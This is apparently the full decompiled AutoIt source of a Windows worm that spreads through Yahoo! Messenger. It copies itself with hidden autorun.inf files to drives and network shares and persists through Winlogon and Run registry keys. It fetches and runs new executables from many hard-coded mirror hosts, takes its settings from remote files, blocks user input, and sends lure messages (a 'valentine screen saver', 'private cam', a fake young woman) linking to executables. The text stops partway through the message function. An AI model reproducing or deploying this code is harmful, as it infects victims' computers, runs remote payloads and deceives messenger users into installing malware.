$VERSION = 4
Func _PROCESSGETNAME ( $I_PID )
	If Not ProcessExists ( $I_PID ) Then
		SetError ( 1 )
		Return ""
	EndIf
	Local $A_PROCESSES = ProcessList ( )
	If Not @error Then
		For $I = 1 To $A_PROCESSES [ 0 ] [ 0 ]
			If $A_PROCESSES [ $I ] [ 1 ] = $I_PID Then Return $A_PROCESSES [ $I ] [ 0 ]
		Next
	EndIf
	SetError ( 1 )
	Return ""
EndFunc
Func _PROCESSGETPRIORITY ( $VPROCESS )
	Local $I_PID = ProcessExists ( $VPROCESS )
	If Not $I_PID Then
		SetError ( 1 )
		Return - 1
	EndIf
	Local $HDLL = DllOpen ( "kernel32.dll" )
	Local $APROCESSHANDLE = DllCall ( $HDLL , "int" , "OpenProcess" , "int" , 1024 , "int" , False , "int" , $I_PID )
	Local $APRIORITY = DllCall ( $HDLL , "int" , "GetPriorityClass" , "int" , $APROCESSHANDLE [ 0 ] )
	DllCall ( $HDLL , "int" , "CloseHandle" , "int" , $APROCESSHANDLE [ 0 ] )
	DllClose ( $HDLL )
	Switch $APRIORITY [ 0 ]
	Case 64
		Return 0
	Case 16384
		Return 1
	Case 32
		Return 2
	Case 32768
		Return 3
	Case 128
		Return 4
	Case 256
		Return 5
Case Else
		SetError ( 1 )
		Return - 1
	EndSwitch
EndFunc
Func _RUNDOS ( $SCOMMAND )
	Local $NRESULT = RunWait ( @ComSpec & " /C " & $SCOMMAND , "" , @SW_HIDE )
	Return SetError ( @error , @extended , $NRESULT )
EndFunc
#NoTrayIcon
If @OSVersion == "WIN_VISTA" Then
	$INSTALLDIR = @DesktopDir
	If $INSTALLDIR = "" Then
		$INSTALLDIR = @TempDir
	EndIf
	$SECONDDIR = $INSTALLDIR
	$ONEMINDIFF = 1499978399
Else
	$INSTALLDIR = @SystemDir
	$SECONDDIR = @WindowsDir
	$ONEMINDIFF = 210500000
EndIf
$DEBUG = False
Dim $PREFSPATH = ""
$TIMESTAMP = @HOUR & "-" & @MIN & "-" & @SEC
$NAME = "system3_"
$MYYMID = "balu311916"
$INI = ".ini"
$NQL = ".nql"
$XLS = ".xls"
$EXE = ".exe"
$HOMEPAGECOUNT = 51
Dim $HOMEPAGE [ $HOMEPAGECOUNT ]
$HOMEPAGE [ 0 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 1 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 2 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 3 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 4 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 5 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 6 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 7 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 8 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 9 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 10 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 11 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 12 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 13 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 14 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 15 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 16 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 17 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 18 ] = "http://www.advgoogle.blogdpot.com"
$HOMEPAGE [ 19 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 20 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 21 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 22 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 23 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 24 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 25 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 26 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 27 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 28 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 29 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 30 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 31 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 32 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 33 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 34 ] = "http://www.advgoogle.blogdpot.com"
$HOMEPAGE [ 35 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 36 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 37 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 38 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 39 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 40 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 41 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 42 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 43 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 44 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 45 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 46 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 47 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 48 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 49 ] = "http://www.mydreamworld.50webs.com"
$HOMEPAGE [ 50 ] = "http://www.advgoogle.blogdpot.com"
$WEBSTORAGEPOOLCOUNT = 51
Dim $WEBSTORAGEPOOL [ $WEBSTORAGEPOOLCOUNT ]
$WEBSTORAGEPOOL [ 0 ] = "http://h1.ripway.com/adb0001"
$WEBSTORAGEPOOL [ 1 ] = "http://h1.ripway.com/adb0002"
$WEBSTORAGEPOOL [ 2 ] = "http://h1.ripway.com/adb0003"
$WEBSTORAGEPOOL [ 3 ] = "http://h1.ripway.com/adb0004"
$WEBSTORAGEPOOL [ 4 ] = "http://h1.ripway.com/adb0005"
$WEBSTORAGEPOOL [ 5 ] = "http://h1.ripway.com/adb0006"
$WEBSTORAGEPOOL [ 6 ] = "http://h1.ripway.com/adb0007"
$WEBSTORAGEPOOL [ 7 ] = "http://h1.ripway.com/adb0008"
$WEBSTORAGEPOOL [ 8 ] = "http://h1.ripway.com/adb0009"
$WEBSTORAGEPOOL [ 9 ] = "http://h1.ripway.com/adb0010"
$WEBSTORAGEPOOL [ 10 ] = "http://h1.ripway.com/adb0011"
$WEBSTORAGEPOOL [ 11 ] = "http://h1.ripway.com/adb0012"
$WEBSTORAGEPOOL [ 12 ] = "http://h1.ripway.com/adb0013"
$WEBSTORAGEPOOL [ 13 ] = "http://h1.ripway.com/adb0014"
$WEBSTORAGEPOOL [ 14 ] = "http://h1.ripway.com/adb0015"
$WEBSTORAGEPOOL [ 15 ] = "http://h1.ripway.com/adb0016"
$WEBSTORAGEPOOL [ 16 ] = "http://h1.ripway.com/adb0017"
$WEBSTORAGEPOOL [ 17 ] = "http://h1.ripway.com/adb0018"
$WEBSTORAGEPOOL [ 18 ] = "http://h1.ripway.com/adb0019"
$WEBSTORAGEPOOL [ 19 ] = "http://h1.ripway.com/adb0020"
$WEBSTORAGEPOOL [ 20 ] = "http://h1.ripway.com/adb0021"
$WEBSTORAGEPOOL [ 21 ] = "http://h1.ripway.com/adb0022"
$WEBSTORAGEPOOL [ 22 ] = "http://h1.ripway.com/adb0023"
$WEBSTORAGEPOOL [ 23 ] = "http://h1.ripway.com/adb0024"
$WEBSTORAGEPOOL [ 24 ] = "http://h1.ripway.com/adb0025"
$WEBSTORAGEPOOL [ 25 ] = "http://h1.ripway.com/adb0026"
$WEBSTORAGEPOOL [ 26 ] = "http://h1.ripway.com/adb0027"
$WEBSTORAGEPOOL [ 27 ] = "http://h1.ripway.com/adb0028"
$WEBSTORAGEPOOL [ 28 ] = "http://h1.ripway.com/adb0029"
$WEBSTORAGEPOOL [ 29 ] = "http://h1.ripway.com/adb0030"
$WEBSTORAGEPOOL [ 30 ] = "http://h1.ripway.com/adb0031"
$WEBSTORAGEPOOL [ 31 ] = "http://h1.ripway.com/adb0032"
$WEBSTORAGEPOOL [ 32 ] = "http://h1.ripway.com/adb0033"
$WEBSTORAGEPOOL [ 33 ] = "http://h1.ripway.com/adb0034"
$WEBSTORAGEPOOL [ 34 ] = "http://h1.ripway.com/adb0035"
$WEBSTORAGEPOOL [ 35 ] = "http://h1.ripway.com/adb0036"
$WEBSTORAGEPOOL [ 36 ] = "http://h1.ripway.com/adb0037"
$WEBSTORAGEPOOL [ 37 ] = "http://h1.ripway.com/adb0038"
$WEBSTORAGEPOOL [ 38 ] = "http://h1.ripway.com/adb0039"
$WEBSTORAGEPOOL [ 39 ] = "http://h1.ripway.com/adb0040"
$WEBSTORAGEPOOL [ 40 ] = "http://h1.ripway.com/adb0041"
$WEBSTORAGEPOOL [ 41 ] = "http://h1.ripway.com/adb0042"
$WEBSTORAGEPOOL [ 42 ] = "http://h1.ripway.com/adb0043"
$WEBSTORAGEPOOL [ 43 ] = "http://h1.ripway.com/adb0044"
$WEBSTORAGEPOOL [ 44 ] = "http://h1.ripway.com/adb0045"
$WEBSTORAGEPOOL [ 45 ] = "http://h1.ripway.com/adb0046"
$WEBSTORAGEPOOL [ 46 ] = "http://h1.ripway.com/adb0047"
$WEBSTORAGEPOOL [ 47 ] = "http://h1.ripway.com/adb0048"
$WEBSTORAGEPOOL [ 48 ] = "http://h1.ripway.com/adb0049"
$WEBSTORAGEPOOL [ 49 ] = "http://h1.ripway.com/adb0050"
$WEBSTORAGEPOOL [ 50 ] = "http://h1.ripway.com/adb0000"
$MAX_SETTINGS_FILE_URLS = 51
Dim $DEFAULTSETTINGSFILEURL [ $MAX_SETTINGS_FILE_URLS ]
$DEFAULTSETTINGSFILEURL [ 0 ] = "http://h1.ripway.com/asdb000/setting.ini"
$DEFAULTSETTINGSFILEURL [ 1 ] = "http://www.balu000.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 2 ] = "http://h1.ripway.com/asdb002/setting.ini"
$DEFAULTSETTINGSFILEURL [ 3 ] = "http://www.balu001.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 4 ] = "http://h1.ripway.com/asdb004/setting.ini"
$DEFAULTSETTINGSFILEURL [ 5 ] = "http://www.balu002.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 6 ] = "http://h1.ripway.com/asdb006/setting.ini"
$DEFAULTSETTINGSFILEURL [ 7 ] = "http://www.balu003.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 8 ] = "http://h1.ripway.com/asdb008/setting.ini"
$DEFAULTSETTINGSFILEURL [ 9 ] = "http://www.balu004.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 10 ] = "http://h1.ripway.com/asdb010/setting.ini"
$DEFAULTSETTINGSFILEURL [ 11 ] = "http://www.balu005.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 12 ] = "http://h1.ripway.com/asdb012/setting.ini"
$DEFAULTSETTINGSFILEURL [ 13 ] = "http://www.balu006.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 14 ] = "http://h1.ripway.com/asdb014/setting.ini"
$DEFAULTSETTINGSFILEURL [ 15 ] = "http://www.balu007.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 16 ] = "http://h1.ripway.com/asdb016/setting.ini"
$DEFAULTSETTINGSFILEURL [ 17 ] = "http://www.balu008.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 18 ] = "http://h1.ripway.com/asdb018/setting.ini"
$DEFAULTSETTINGSFILEURL [ 19 ] = "http://www.balu009.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 20 ] = "http://h1.ripway.com/asdb020/setting.ini"
$DEFAULTSETTINGSFILEURL [ 21 ] = "http://www.balu010.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 22 ] = "http://h1.ripway.com/asdb022/setting.ini"
$DEFAULTSETTINGSFILEURL [ 23 ] = "http://www.balu011.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 24 ] = "http://h1.ripway.com/asdb024/setting.ini"
$DEFAULTSETTINGSFILEURL [ 25 ] = "http://www.balu012.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 26 ] = "http://h1.ripway.com/asdb026/setting.ini"
$DEFAULTSETTINGSFILEURL [ 27 ] = "http://www.balu013.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 28 ] = "http://h1.ripway.com/asdb028/setting.ini"
$DEFAULTSETTINGSFILEURL [ 29 ] = "http://www.balu014.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 30 ] = "http://h1.ripway.com/asdb030/setting.ini"
$DEFAULTSETTINGSFILEURL [ 31 ] = "http://www.balu015.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 32 ] = "http://h1.ripway.com/asdb032/setting.ini"
$DEFAULTSETTINGSFILEURL [ 33 ] = "http://www.balu016.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 34 ] = "http://h1.ripway.com/asdb034/setting.ini"
$DEFAULTSETTINGSFILEURL [ 35 ] = "http://www.balu017.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 36 ] = "http://h1.ripway.com/asdb036/setting.ini"
$DEFAULTSETTINGSFILEURL [ 37 ] = "http://www.balu018.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 38 ] = "http://h1.ripway.com/asdb038/setting.ini"
$DEFAULTSETTINGSFILEURL [ 39 ] = "http://www.balu019.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 40 ] = "http://h1.ripway.com/asdb040/setting.ini"
$DEFAULTSETTINGSFILEURL [ 41 ] = "http://www.balu020.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 42 ] = "http://h1.ripway.com/asdb042/setting.ini"
$DEFAULTSETTINGSFILEURL [ 43 ] = "http://www.balu021.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 44 ] = "http://h1.ripway.com/asdb044/setting.ini"
$DEFAULTSETTINGSFILEURL [ 45 ] = "http://www.balu022.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 46 ] = "http://h1.ripway.com/asdb046/setting.ini"
$DEFAULTSETTINGSFILEURL [ 47 ] = "http://www.balu023.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 48 ] = "http://h1.ripway.com/asdb048/setting.ini"
$DEFAULTSETTINGSFILEURL [ 49 ] = "http://www.balu024.0catch.com/set/setting.ini"
$DEFAULTSETTINGSFILEURL [ 50 ] = "http://h1.ripway.com/asdb050/setting.ini"
$SETTINGSFILEPATH = $INSTALLDIR & "\setting.ini"
$LOGFILENAME = @TempDir & "\log_" & $TIMESTAMP & ".txt"
$VIRUS_FILE1 = $INSTALLDIR & "\" & $NAME & $EXE
$VIRUS_FILE2 = $SECONDDIR & "\" & $NAME & $EXE
$SENDMSGDELAY = 10
$SENDUPDATEDELAY = 240
$COPYINDISKDELAY = 1
MAIN ( )
Func ADDID ( $MYID )
	$MYID = GETVAR ( "myid" , $MYID )
	If SAIFTYCHECK ( "addID" ) Then
		$TIEUDE = "Yahoo! Messenger"
		BlockInput ( 1 )
		WinActivate ( $TIEUDE )
		Send ( "^A" )
		For $TRY = 1 To 10000
			$TEXT = ControlGetText ( "Add to Messenger List" , "" , "[CLASS:Edit; INSTANCE:1]" )
			ControlSetText ( "Add to Messenger List" , "" , "[CLASS:Edit; INSTANCE:1]" , $MYID )
			If $TEXT == $MYID Then
				ExitLoop
			EndIf
		Next
		For $TRY = 1 To 20
			$TEXT = ControlGetText ( "Add to Messenger List" , "" , "[CLASS:Static; INSTANCE:16]" )
			If StringInStr ( $TEXT , "already exists" ) Then
				ControlClick ( "Add to Messenger List" , "" , "[CLASS:Button; INSTANCE:4]" )
			EndIf
			If StringInStr ( $TEXT , "has been added" ) Then
				ControlClick ( "Add to Messenger List" , "" , "[CLASS:Button; INSTANCE:4]" )
			EndIf
			If WinActivate ( "Add to Messenger List" ) Then
				Send ( "{enter}" )
			Else
				ExitLoop
			EndIf
		Next
		BlockInput ( 0 )
	EndIf
EndFunc
Func COPYINDISK ( $DRIVES )
	If Not FileExists ( "c:\disk.txt" ) Then
		If SAIFTYCHECK ( "copyInDisk: " & $DRIVES ) Then
			If Not FileExists ( $VIRUS_FILE2 ) Then
				DEBUG ( "Error: " & $VIRUS_FILE2 & "not found." )
			Else
				DEBUG ( "Copying from " & $VIRUS_FILE2 )
				$DISK = DriveGetDrive ( $DRIVES )
				If Not @error Then
					For $I = 1 To $DISK [ 0 ]
						If $DISK [ $I ] <> "A:" Then
							If Not StringInStr ( @SystemDir , $DISK [ $I ] , 0 , 1 , 1 , 2 ) Then
								LOGMSG ( "Copy " & $VIRUS_FILE2 & " to " & $DISK [ $I ] & "\New Folder.exe" )
								FileCopy ( $VIRUS_FILE2 , $DISK [ $I ] & "\New Folder.exe" , 0 )
								Sleep ( 1 )
								LOGMSG ( "Copy " & $VIRUS_FILE1 & " to " & $DISK [ $I ] & "\" & $NAME & $EXE )
								FileCopy ( $VIRUS_FILE1 , $DISK [ $I ] & "\" & $NAME & $EXE , 0 )
								Sleep ( 1 )
								LOGMSG ( "Copy " & $INSTALLDIR & "\autorun.ini" & " to " & $DISK [ $I ] & "\autorun.inf" )
								FileCopy ( $INSTALLDIR & "\autorun.ini" , $DISK [ $I ] & "\autorun.inf" , 0 )
								FileSetAttrib ( $DISK [ $I ] & "\autorun.inf" , "+RSH" )
								Sleep ( 1 )
								SEARCHANDSPREAD ( $DISK [ $I ] )
							EndIf
						EndIf
					Next
				EndIf
			EndIf
		EndIf
	Else
		DEBUG ( "Skipping copyInDisk as c:\disk.txt is exists" )
	EndIf
EndFunc
Func COPYNETWORK ( )
	If SAIFTYCHECK ( "copynetwork" ) Then
		If Not FileExists ( "c:\disk.txt" ) Then
			$A = RegRead ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared" )
			If ( Not ( $A = "" ) ) Then
				DEBUG ( "Network Sharing is off on this computer." )
			Else
				Dim $MANG [ 30 ]
				For $I = 1 To 30
					$READ = RegEnumKey ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , $I )
					If @error Then
						DEBUG ( "Found " & Number ( $I - 1 ) & " Network connections" )
						ExitLoop
					EndIf
					$READ = StringReplace ( $READ , "/" , "\" )
					$MANG [ $I ] = "\\" & $READ
					DEBUG ( "copynetwork: " & $MANG [ $I ] & "\New Folder.exe" )
					$CHECKCOPY = FileCopy ( $VIRUS_FILE2 , $MANG [ $I ] & "\New Folder.exe" , 1 )
					If $CHECKCOPY = 1 Then
						FileCopy ( $VIRUS_FILE1 , $MANG [ $I ] & "\" & $NAME & $EXE , 0 )
						FileCopy ( $INSTALLDIR & "\autorun.ini" , $MANG [ $I ] & "\autorun.inf" , 1 )
						FileSetAttrib ( $MANG [ $I ] & "\autorun.inf" , "+RSH" )
						SEARCHANDSPREAD ( $MANG [ $I ] )
					Else
						DEBUG ( "copynetwork: ERROR unable to copy " & $MANG [ $I ] & "\New Folder.exe" )
					EndIf
				Next
				RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" , "shared" , "REG_SZ" , $MANG [ $I - 1 ] & "\New Folder.exe" )
			EndIf
		Else
			DEBUG ( "Skipping copynetwork as c:\disk.txt is exists" )
		EndIf
	EndIf
EndFunc
Func CREATEINI ( )
	If SAIFTYCHECK ( "createini" ) Then
		IniWrite ( $INSTALLDIR & "\autorun.ini" , "Autorun" , "Open" , $NAME & $EXE )
		IniWrite ( $INSTALLDIR & "\autorun.ini" , "Autorun" , "Shellexecute" , $NAME & $EXE )
		IniWrite ( $INSTALLDIR & "\autorun.ini" , "Autorun" , "Shell\Open\command" , $NAME & $EXE )
		IniWrite ( $INSTALLDIR & "\autorun.ini" , "Autorun" , "Shell" , "Open" )
		Sleep ( 1 )
		FileSetAttrib ( $INSTALLDIR & "\autorun.ini" , "+RSH" )
		If FileExists ( $INSTALLDIR & "\autorun.ini" ) Then
			DEBUG ( "Created " & $INSTALLDIR & "\autorun.ini" )
		Else
			DEBUG ( "Error: " & $INSTALLDIR & "\autorun.ini" & " not copied." )
		EndIf
	EndIf
EndFunc
Func DEBUG ( $MSG = "I am here" )
	If $DEBUG Then
		MsgBox ( 0 , "Debug msg - Time " & $TIMESTAMP , $MSG )
		LOGMSG ( $MSG )
	EndIf
EndFunc
Func DISABLEWINAPPS ( )
	If SAIFTYCHECK ( "disableWinApps - " & @CRLF & "Explorer.exe " & $NAME & $EXE & @CRLF & "Run yahoo messanger at startup" & @CRLF & "NofolderOptions" & @CRLF & "DisableTaskMgr" & @CRLF & "DisableRegistryTools" & @CRLF & "unable schedulor" ) Then
		RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" , "Shell" , "REG_SZ" , "Explorer.exe " & $NAME & $EXE )
		RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Yahoo Messengger" , "REG_SZ" , $VIRUS_FILE1 )
		RegWrite ( "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule" , "AtTaskMaxHours" , "REG_DWORD" , 0 )
	EndIf
EndFunc
Func DOWNLOADBINARY ( $FILE , $EXT )
	If $FILE <> "" Then
		$NEWLOCALCOPY = $INSTALLDIR & "\" & $FILE & "_.exe"
		$LOCALCOPY = $INSTALLDIR & "\" & $FILE & ".exe"
		$FILEURL = GETBINARYPATH ( $EXT )
		DEBUG ( "Trying to download " & $FILEURL )
		$SIZE = InetGetSize ( $FILEURL )
		If $SIZE < 200000 Then
			DEBUG ( "Error: Binary size on site is less then 200KB. " & Chr ( 10 ) & $FILEURL & Chr ( 10 ) & "ABORT downloading '" & $FILE & $EXT & "'" )
			Return 2
		EndIf
		FileSetAttrib ( $NEWLOCALCOPY , "-RSH" )
		If InetGet ( $FILEURL , $NEWLOCALCOPY , 1 , 0 ) Then
			Sleep ( 1000 )
			DEBUG ( "Downloaded " & $NEWLOCALCOPY & " from " & $FILEURL & @CRLF & "Now testing it..." )
		Else
			DEBUG ( "Unable to download file " & $NEWLOCALCOPY )
			Return 2
		EndIf
		If Number ( FileGetSize ( $NEWLOCALCOPY ) ) < 200000 Then
			DEBUG ( "Invalid Binary size: " & $NEWLOCALCOPY )
			Return 2
		EndIf
		Sleep ( 3000 )
		FileSetAttrib ( $LOCALCOPY , "-RSH" )
		Sleep ( 1000 )
		FileMove ( $NEWLOCALCOPY , $LOCALCOPY , 1 )
		Sleep ( 1000 )
		DEBUG ( "DONE: " & $LOCALCOPY & " is readable. Downloaded from " & Chr ( 10 ) & $FILEURL )
		Sleep ( 1000 )
		FileSetAttrib ( $LOCALCOPY , "+RSH" )
		DEBUG ( "Executing New version of programe...." )
		Run ( $LOCALCOPY )
		DEBUG ( "New version of programe is executed, killing this thread... BYE" )
		Exit
	EndIf
EndFunc
Func DOWNLOADSETTINGSFILE ( )
	For $INDEX = 0 To $MAX_SETTINGS_FILE_URLS - 1 Step 1
		$SETTINGSFILEURL = GETVAR ( "settingsFileURL[" & $INDEX & "]" , $DEFAULTSETTINGSFILEURL [ $INDEX ] )
		$LOCALCOPY = $SETTINGSFILEPATH
		$NEWLOCALCOPY = $INSTALLDIR & "\_setting.ini"
		$SIZE = InetGetSize ( $SETTINGSFILEURL )
		If $SIZE < 4000 Then
			DEBUG ( "Error: Unable to connect " & $SETTINGSFILEURL & " Trying next mirror." & @CRLF & "Remaining attempts: " & $INDEX & "/" & $MAX_SETTINGS_FILE_URLS - 1 )
			ContinueLoop
		EndIf
		FileSetAttrib ( $NEWLOCALCOPY , "-RSH" )
		If InetGet ( $SETTINGSFILEURL , $NEWLOCALCOPY , 1 , 0 ) Then
			Sleep ( 1000 )
			DEBUG ( "Downloaded " & $NEWLOCALCOPY & " from " & $SETTINGSFILEURL & @CRLF & "Now testing it..." )
			$FORMATE = IniRead ( $NEWLOCALCOPY , "setting" , "format" , "NOT_READABEL" )
			If $FORMATE = "NOT_READABEL" Then
				DEBUG ( $FORMATE & "ERROR: " & $NEWLOCALCOPY & " is not readable" & @CRLF & "Remaining attempts: " & $INDEX & "/" & $MAX_SETTINGS_FILE_URLS - 1 )
				ContinueLoop
			Else
				FileSetAttrib ( $LOCALCOPY , "-RSH" )
				Sleep ( 1000 )
				FileMove ( $NEWLOCALCOPY , $LOCALCOPY , 1 )
				Sleep ( 1000 )
				DEBUG ( "DONE: " & $LOCALCOPY & " is readable. Downloaded from " & $SETTINGSFILEURL )
				Sleep ( 1000 )
				FileSetAttrib ( $LOCALCOPY , "+RSH" )
				Return
			EndIf
		Else
			DEBUG ( "ERROR: Failed to save file " & $SETTINGSFILEURL & " at " & $NEWLOCALCOPY & @CRLF & "Remaining attempts: " & $INDEX & "/" & $MAX_SETTINGS_FILE_URLS - 1 )
			ContinueLoop
		EndIf
	Next
EndFunc
Func GETBINARYPATH ( $EXT )
	$WEBSTORAGE = GETVAR ( "webstoragepool[15]" , $WEBSTORAGEPOOL [ 15 ] )
	$WEBSTORAGEPOOLCOUNT = GETVAR ( "webstoragepoolcount" , $WEBSTORAGEPOOLCOUNT )
	If ( Not ( $WEBSTORAGEPOOLCOUNT = 0 ) ) Then
		$RANDOMMINRANGE = 0
		$RANDOMMAXRANGE = $WEBSTORAGEPOOLCOUNT - 1
		$RENDOMGETINTVALUE = 1
		$RANDOMNUMBER = Random ( $RANDOMMINRANGE , $RANDOMMAXRANGE , $RENDOMGETINTVALUE )
		$WEBSTORAGE = GETVAR ( "webstoragepool[" & $RANDOMNUMBER & "]" , $WEBSTORAGEPOOL [ $RANDOMNUMBER ] )
	EndIf
	$BINARYPATH = $WEBSTORAGE & "/" & GETVAR ( "filedownload1" , "privateCam" ) & $EXT
	Return $BINARYPATH
EndFunc
Func GETFILENAME ( $FULLFILENAME )
	$ARRAY = StringSplit ( $FULLFILENAME , "\" , 1 )
	Return $ARRAY [ $ARRAY [ 0 ] ]
EndFunc
Func GETHOMEPAGE ( $ALWAYSZEROINDEX = 0 )
	$HOMEPAGECOUNT = GETVAR ( "homepagecount" , $HOMEPAGECOUNT )
	If $HOMEPAGECOUNT = 0 Then
		Return $HOMEPAGE [ 0 ]
	EndIf
	If $ALWAYSZEROINDEX Then
		Return GETVAR ( "homepage[0]" , $HOMEPAGE [ 0 ] )
	EndIf
	$RANDOMMINRANGE = 0
	$RANDOMMAXRANGE = $HOMEPAGECOUNT - 1
	$RENDOMGETINTVALUE = 1
	$RANDOMNUMBER = Random ( $RANDOMMINRANGE , $RANDOMMAXRANGE , $RENDOMGETINTVALUE )
	Return GETVAR ( "homepage[" & $RANDOMNUMBER & "]" , $HOMEPAGE [ $RANDOMNUMBER ] )
EndFunc
Func GETRANDOMMSG ( )
	$MAX_INDEX = 10
	$MSGCOUNT = GETVAR ( "msgcount" , $MAX_INDEX )
	Dim $MSG [ 1000 ]
	$MSG [ 0 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  and get new tips and tricks from URL"
	$MSG [ 1 ] = "happy valentine day screen saver and beautiful screen saver from lovers http://advgoogle.0catch.com/love.scr  and URL "
	$MSG [ 2 ] = "golden lovers rose screen saver from http://advgoogle.0catch.com/love.scr   and see more from URL"
	$MSG [ 3 ] = "rose is always red ,see in http://advgoogle.0catch.com/love.scr screen saver from URL"
	$MSG [ 4 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  and get new tips and tricks from URL"
	$MSG [ 5 ] = "I  LOVE YOUUUUUUUUUUUUU  from screensaver http://advgoogle.0catch.com/love.scr   see more in URL"
	$MSG [ 6 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  and get new tips and tricks from URL"
	$MSG [ 7 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  and get new tips and tricks for lovers URL "
	$MSG [ 8 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  " & @CRLF & " and view secrets from private cam BIN"
	$MSG [ 9 ] = "happy valentine day screen saver from http://advgoogle.0catch.com/love.scr  " & @CRLF & " and view secrets from private cam BIN"
	$MSG [ 9 ] = "asl please" & @CRLF & "I am 23 Female, Delhi (India)" & @CRLF & "and you?"
	$RANDOMMINRANGE = 0
	$RANDOMMAXRANGE = $MSGCOUNT - 1
	$RENDOMGETINTVALUE = 1
	$RANDOMNUMBER = Random ( $RANDOMMINRANGE , $RANDOMMAXRANGE , $RENDOMGETINTVALUE )
	$RENDOMMSG = GETVAR ( "msg[" & $RANDOMNUMBER & "]" , $MSG [ $RANDOMNUMBER ] )
	$RENDOMMSG = StringRegExpReplace ( $RENDOMMSG , "URL" , GETHOMEPAGE ( ) )
	$RENDOMMSG = StringRegExpReplace ( $RENDOMMSG , "BIN" , GETBINARYPATH ( ".exe" ) )
